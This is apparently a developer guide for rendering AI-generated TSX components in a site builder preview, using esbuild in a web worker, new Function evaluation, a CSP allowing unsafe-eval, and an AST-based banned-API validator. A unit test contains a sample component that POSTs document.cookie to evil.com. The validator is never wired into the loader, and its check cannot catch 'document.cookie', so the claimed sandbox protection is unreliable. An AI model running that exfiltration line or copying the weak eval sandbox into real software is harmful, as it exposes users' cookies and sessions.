# 🛠️ Pixel-Perfect Preview: Implementation Guide

## Quick Start POC

### Step 1: Extend Current Worker Infrastructure

```typescript
// src/workers/component-compiler.worker.ts
import * as esbuild from 'esbuild-wasm'
import wasmURL from 'esbuild-wasm/esbuild.wasm?url'

let initialized = false

async function initializeEsbuild() {
  if (!initialized) {
    await esbuild.initialize({
      wasmURL,
      worker: true
    })
    initialized = true
  }
}

self.addEventListener('message', async (event) => {
  const { type, payload } = event.data
  
  if (type === 'COMPILE_COMPONENT') {
    try {
      await initializeEsbuild()
      
      const { tsx, componentId } = payload
      
      // Compile TSX to ES module
      const result = await esbuild.transform(tsx, {
        loader: 'tsx',
        format: 'esm',
        target: 'es2020',
        jsx: 'automatic',
        jsxImportSource: 'react'
      })
      
      // Generate hash for caching
      const hash = await crypto.subtle.digest(
        'SHA-256',
        new TextEncoder().encode(tsx)
      )
      const hashHex = Array.from(new Uint8Array(hash))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('')
      
      self.postMessage({
        type: 'COMPILE_SUCCESS',
        payload: {
          componentId,
          esm: result.code,
          hash: hashHex
        }
      })
    } catch (error) {
      self.postMessage({
        type: 'COMPILE_ERROR',
        payload: { componentId, error: error.message }
      })
    }
  }
})
```

### Step 2: Create Component Loader Service

```typescript
// src/services/preview/component-loader.ts
import { logger } from '@/utils/logger'

interface CompiledComponent {
  hash: string
  esm: string
  Component: React.ComponentType<any>
}

class ComponentLoaderService {
  private cache = new Map<string, CompiledComponent>()
  private worker: Worker | null = null
  
  async loadComponent(
    componentId: string, 
    tsx: string, 
    hash?: string
  ): Promise<React.ComponentType<any>> {
    // Check cache first
    if (hash && this.cache.has(hash)) {
      return this.cache.get(hash)!.Component
    }
    
    // Initialize worker if needed
    if (!this.worker) {
      this.worker = new Worker(
        new URL('../../workers/component-compiler.worker.ts', import.meta.url)
      )
    }
    
    // Compile component
    const compiled = await this.compileComponent(componentId, tsx)
    
    // Create React component from ESM
    const Component = this.createComponentFromESM(compiled.esm)
    
    // Cache for reuse
    this.cache.set(compiled.hash, {
      hash: compiled.hash,
      esm: compiled.esm,
      Component
    })
    
    return Component
  }
  
  private compileComponent(componentId: string, tsx: string): Promise<any> {
    return new Promise((resolve, reject) => {
      const handler = (event: MessageEvent) => {
        if (event.data.type === 'COMPILE_SUCCESS') {
          this.worker?.removeEventListener('message', handler)
          resolve(event.data.payload)
        } else if (event.data.type === 'COMPILE_ERROR') {
          this.worker?.removeEventListener('message', handler)
          reject(new Error(event.data.payload.error))
        }
      }
      
      this.worker?.addEventListener('message', handler)
      this.worker?.postMessage({
        type: 'COMPILE_COMPONENT',
        payload: { componentId, tsx }
      })
    })
  }
  
  private createComponentFromESM(esm: string): React.ComponentType<any> {
    // Create a sandboxed function to evaluate the ESM
    const sandbox = {
      React: window.React,
      exports: {}
    }
    
    // Wrap in IIFE to contain scope
    const wrappedCode = `
      (function(React, exports) {
        ${esm}
        return exports.default || exports;
      })
    `
    
    // Evaluate in controlled environment
    const fn = new Function('React', 'exports', wrappedCode)
    return fn(sandbox.React, sandbox.exports)
  }
}

export const componentLoader = new ComponentLoaderService()
```

### Step 3: Update Preview Renderer

```typescript
// src/components/builder/preview/compiled-section-renderer.tsx
import { useState, useEffect } from 'react'
import { componentLoader } from '@/services/preview/component-loader'
import type { SectionState } from '@/store/builder-store'

interface CompiledSectionRendererProps {
  section: SectionState
}

export function CompiledSectionRenderer({ section }: CompiledSectionRendererProps) {
  const [Component, setComponent] = useState<React.ComponentType<any> | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  
  useEffect(() => {
    if (section.componentTsx) {
      loadComponent()
    }
  }, [section.componentTsx, section.componentHash])
  
  async function loadComponent() {
    try {
      setIsLoading(true)
      const LoadedComponent = await componentLoader.loadComponent(
        section.id,
        section.componentTsx!,
        section.componentHash
      )
      setComponent(() => LoadedComponent)
      setError(null)
    } catch (err) {
      console.error('Failed to load component:', err)
      setError(err.message)
    } finally {
      setIsLoading(false)
    }
  }
  
  if (isLoading) {
    return (
      <div className="flex items-center justify-center p-8">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-gray-900"></div>
      </div>
    )
  }
  
  if (error) {
    return (
      <div className="bg-red-50 border border-red-200 rounded-lg p-4 m-4">
        <p className="text-red-800">Failed to render component: {error}</p>
      </div>
    )
  }
  
  if (!Component) {
    return null
  }
  
  // Render the compiled component with props
  return (
    <div className="compiled-section-wrapper">
      <Component {...section.content.props} />
    </div>
  )
}
```

### Step 4: Feature Flag Integration

```typescript
// src/components/builder/preview/preview-renderer.tsx
import { FEATURE_FLAGS } from '@/config/feature-flags'
import { CompiledSectionRenderer } from './compiled-section-renderer'

const getSectionRenderer = (section: SectionState) => {
  // Use compiled renderer if enabled and component has TSX
  if (FEATURE_FLAGS.ENABLE_COMPILED_PREVIEW && section.componentTsx) {
    return <CompiledSectionRenderer section={section} />
  }
  
  // Fallback to props-based renderers
  switch (section.type) {
    case 'hero':
      return <HeroRenderer section={section} />
    // ... existing cases
  }
}
```

### Step 5: Update Template Structure

```typescript
// src/services/ai/mock-service.ts
// Update salon template to include TSX
"Hero": {
  "propsSchema": {
    "title": "Bella Vista Salon",
    "subtitle": "Your Beauty Destination"
  },
  "tsx": `
export default function Hero({ title, subtitle, description, ctaText, imageUrl }) {
  return (
    <section className="relative overflow-hidden bg-gradient-to-br from-rose-50 to-purple-50">
      <div className="absolute inset-0">
        <div className="absolute inset-0 bg-gradient-to-r from-purple-600/10 to-pink-600/10 mix-blend-multiply" />
      </div>
      <div className="relative mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-24 sm:py-32">
        <div className="text-center">
          <h1 className="text-5xl font-bold tracking-tight bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent sm:text-6xl md:text-7xl">
            {title}
          </h1>
          <p className="mt-4 text-2xl text-purple-800 font-light">
            {subtitle}
          </p>
          <p className="mt-6 text-lg leading-8 text-gray-600 max-w-2xl mx-auto">
            {description}
          </p>
          <div className="mt-10 flex items-center justify-center gap-x-6">
            <button className="rounded-full bg-gradient-to-r from-purple-600 to-pink-600 px-8 py-4 text-lg font-semibold text-white shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200">
              {ctaText}
            </button>
          </div>
        </div>
      </div>
    </section>
  )
}
  `.trim()
}
```

---

## Security Implementation

### Content Security Policy

```typescript
// src/middleware/csp-headers.ts
// Add to existing CSP
const cspDirectives = {
  // ... existing
  'script-src': [
    "'self'",
    "'unsafe-eval'", // Required for component evaluation
    "blob:", // For worker scripts
  ],
  'worker-src': [
    "'self'",
    "blob:", // For worker initialization
  ]
}
```

### Component Validation

```typescript
// src/services/preview/component-validator.ts
import { parse } from '@babel/parser'
import traverse from '@babel/traverse'

export function validateComponentCode(tsx: string): { 
  isValid: boolean
  errors: string[] 
} {
  const errors: string[] = []
  
  try {
    const ast = parse(tsx, {
      sourceType: 'module',
      plugins: ['jsx', 'typescript']
    })
    
    // Check for banned APIs
    const bannedGlobals = [
      'fetch', 'XMLHttpRequest', 'WebSocket',
      'localStorage', 'sessionStorage', 'document.cookie',
      'eval', 'Function', 'setTimeout', 'setInterval'
    ]
    
    traverse(ast, {
      Identifier(path) {
        if (bannedGlobals.includes(path.node.name)) {
          errors.push(`Banned API usage: ${path.node.name}`)
        }
      }
    })
    
    return {
      isValid: errors.length === 0,
      errors
    }
  } catch (err) {
    return {
      isValid: false,
      errors: [`Parse error: ${err.message}`]
    }
  }
}
```

---

## Performance Optimization

### 1. Bundle Caching with Supabase

```typescript
// src/services/preview/component-cache.ts
import { createClient } from '@/lib/supabase'

export class ComponentCache {
  private supabase = createClient()
  private bucket = 'compiled-components'
  
  async get(hash: string): Promise<string | null> {
    try {
      const { data } = await this.supabase.storage
        .from(this.bucket)
        .download(`${hash}.js`)
      
      if (data) {
        return await data.text()
      }
    } catch (err) {
      console.warn('Cache miss:', hash)
    }
    return null
  }
  
  async set(hash: string, esm: string): Promise<void> {
    await this.supabase.storage
      .from(this.bucket)
      .upload(`${hash}.js`, new Blob([esm]), {
        contentType: 'application/javascript',
        cacheControl: '604800' // 1 week
      })
  }
}
```

### 2. Lazy Worker Loading

```typescript
// Only load esbuild when needed
let compilerWorker: Worker | null = null

function getCompilerWorker(): Worker {
  if (!compilerWorker) {
    compilerWorker = new Worker(
      new URL('./component-compiler.worker.ts', import.meta.url),
      { type: 'module' }
    )
  }
  return compilerWorker
}
```

---

## Testing Strategy

### Unit Tests

```typescript
// src/__tests__/component-compiler.test.ts
describe('Component Compiler', () => {
  it('compiles simple TSX component', async () => {
    const tsx = `
      export default function Test({ name }) {
        return <div>Hello {name}</div>
      }
    `
    
    const result = await componentLoader.loadComponent('test', tsx)
    expect(result).toBeDefined()
    expect(typeof result).toBe('function')
  })
  
  it('rejects malicious code', async () => {
    const maliciousTsx = `
      export default function Evil() {
        fetch('https://evil.com/steal', { 
          method: 'POST', 
          body: document.cookie 
        })
        return <div>Evil</div>
      }
    `
    
    await expect(
      componentLoader.loadComponent('evil', maliciousTsx)
    ).rejects.toThrow('Banned API usage')
  })
})
```

---

## Rollout Checklist

### Week 1
- [ ] Implement basic worker compiler
- [ ] Test with hardcoded salon Hero component
- [ ] Measure compilation performance

### Week 2  
- [ ] Add component validation
- [ ] Implement caching layer
- [ ] Create CompiledSectionRenderer

### Week 3
- [ ] Update template format with TSX
- [ ] Add feature flag
- [ ] Test end-to-end flow

### Week 4
- [ ] Security audit
- [ ] Performance optimization
- [ ] Documentation

### Week 5
- [ ] Beta testing with select users
- [ ] Monitor metrics
- [ ] Fix edge cases

### Week 6
- [ ] General availability
- [ ] Deprecation notice for old system
- [ ] Migration tools